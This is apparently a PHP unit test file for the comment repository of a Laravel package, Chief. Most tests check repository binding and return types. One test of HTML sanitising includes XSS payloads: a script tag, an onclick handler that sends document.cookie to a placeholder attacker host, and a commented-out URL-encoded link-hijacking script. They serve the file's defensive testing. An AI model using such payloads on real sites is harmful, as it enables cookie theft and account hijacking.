<?php

class ChiefCommentTest extends TestCase {

	
	/**
	 * Reach Chief CommentRepository
	 *
	 * @return void
	 */
	public function testCommentRepository()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$commentRepo = $chief->comment();

		$this->assertTrue( $commentRepo instanceof \Bencavens\Chief\Posts\CommentRepositoryInterface );
		$this->assertTrue( $commentRepo instanceof \Bencavens\Chief\Posts\CommentRepository );
	}

	/**
	 * Custom extend CommentRepository
	 *
	 * @return void
	 */
	public function testCommentRepositoryExtend()
	{
		include_once 'assets/Customrepositories.php';	
		include_once 'assets/Custommodels.php';	

		// CommentRepository
		$this->app->bind(
			'Bencavens\Chief\Posts\CommentRepositoryInterface',
			'Bencavens\Chief\Tests\CustomCommentRepository'
		);

		$chief = App::make('Bencavens\Chief\Chief');

		$commentRepo = $chief->comment();

		$this->assertTrue( $commentRepo instanceof \Bencavens\Chief\Posts\CommentRepositoryInterface );
		$this->assertTrue( $commentRepo instanceof \Bencavens\Chief\Tests\CustomCommentRepository );
	}

	/**
	 * Call comment Model from CommentRepository
	 *
	 * @return void
	 */
	public function testCommentRepositoryModel()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$commentRepo = $chief->comment();

		$comment = $commentRepo->getById(1);

		$this->assertTrue( $comment instanceof \Illuminate\Database\Eloquent\Model );
	}

	/**
	 * Call comment Model from CommentRepository
	 *
	 * @return void
	 */
	public function testCommentRepositoryModelExtend()
	{
		include_once 'assets/Customrepositories.php';	
		include_once 'assets/Custommodels.php';	

		// CommentRepository
		$this->app->bind(
			'Bencavens\Chief\Posts\CommentRepositoryInterface',
			'Bencavens\Chief\Tests\CustomCommentRepository'
		);

		$chief = App::make('Bencavens\Chief\Chief');

		$commentRepo = $chief->comment();

		$comment = $commentRepo->getById(1);

		$this->assertTrue( $comment instanceof \Illuminate\Database\Eloquent\Model );
		$this->assertTrue( $comment instanceof \Bencavens\Chief\Tests\CustomCommentModel );
	
	}

	/**
	 * Call comment Model from CommentRepository
	 *
	 * @return void
	 */
	public function testCommentRepositoryGetAll()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$commentRepo = $chief->comment();

		$comments = $commentRepo->getAll();
		
		$this->assertTrue( $comments instanceof \Illuminate\Database\Eloquent\Collection );
	}

	/**
	 * Call comment Model from CommentRepository
	 *
	 * @return void
	 */
	public function testCommentRepositoryCollection()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$commentRepo = $chief->comment();

		$comments = $commentRepo->getAll();
		
		// Get first item slug
		$first = $comments[0];
		$this->assertTrue(($first->email == 'cavensben@gmail.com'));

		// Convert to Array
		$comments = $comments->toArray();
		$this->assertTrue( is_array($comments));
	}

	/**
	 * plain content
	 *
	 * @return void
	 */
	public function testCommentGetPlainContent()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$commentRepo = $chief->comment();

		$comment = $commentRepo->getById(1);
		
		$content = $comment->plaincontent;

		$this->assertTrue( is_string($content) );
	}

	/**
	 * Clean HTML
	 *
	 * @return void
	 */
	public function testCommentSetHTMLContent()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$commentRepo = $chief->comment();

		$comment = $commentRepo->getById(1);
		
		$comment->content = "<h1>test</h1><p>allowed</p>";

		$this->assertTrue( is_string($comment->content) );
		$this->assertStringStartsWith( 'test', $comment->content );
		$this->assertStringEndsWith( '</p>', $comment->content );

		$comment->content = "<a href='http://example.com'>example</a>";

		$this->assertTrue( is_string($comment->content) );
		$this->assertStringStartsWith( '<a', $comment->content );
		$this->assertStringEndsWith( '</a>', $comment->content );

		// XSS attack examples
		$comment->content = "<script>alert('attacked')</script><h1>test</h1><p>allowed</p>";

		$this->assertTrue( is_string($comment->content) );
		$this->assertStringStartsWith( 'test', $comment->content );

		$comment->content ="<a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">My Name</a>";
		$this->assertTrue( (false === strpos($comment->content,'onclick') ));

		// Xss attack which reads: <script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://not-real-xssattackexamples.com/";}</script>
		// $comment->content = "%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2d%73%69%74%65%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e";
		// $this->assertEmpty( $comment->content );

	}

	/**
	 * Get All published
	 *
	 * @return void
	 */
	public function testCommentGetAllApproved()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$commentRepo = $chief->comment();

		$comments = $commentRepo->getAllApproved();
		
		$this->assertTrue( $comments instanceof \Illuminate\Database\Eloquent\Collection );
	}

	/**
	 * Get All Archived
	 *
	 * @return void
	 */
	public function testCommentGetAllPending()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$commentRepo = $chief->comment();

		$comments = $commentRepo->getAllPending();
		
		$this->assertTrue( $comments instanceof \Illuminate\Database\Eloquent\Collection );
	}

	/**
	 * Get All approved comments by post
	 *
	 * @return void
	 */
	public function testCommentGetByPost()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$commentRepo = $chief->comment();

		$comments = $commentRepo->getByPost( 1 );
		
		$this->assertTrue( $comments instanceof \Illuminate\Database\Eloquent\Collection );
	}

	/**
	 * Get All pending comments by post
	 *
	 * @return void
	 */
	public function testCommentGetPendingByPost()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$commentRepo = $chief->comment();

		$comments = $commentRepo->getByPost( 1 , 'pending' );
		
		$this->assertTrue( $comments instanceof \Illuminate\Database\Eloquent\Collection );
	}


	/**
	 * Get All comments by post
	 *
	 * @return void
	 */
	public function testCommentGetAllByPost()
	{
		$chief = App::make('Bencavens\Chief\Chief');

		$commentRepo = $chief->comment();

		$comments = $commentRepo->getAllByPost( 1 );
		
		$this->assertTrue( $comments instanceof \Illuminate\Database\Eloquent\Collection );
	}



}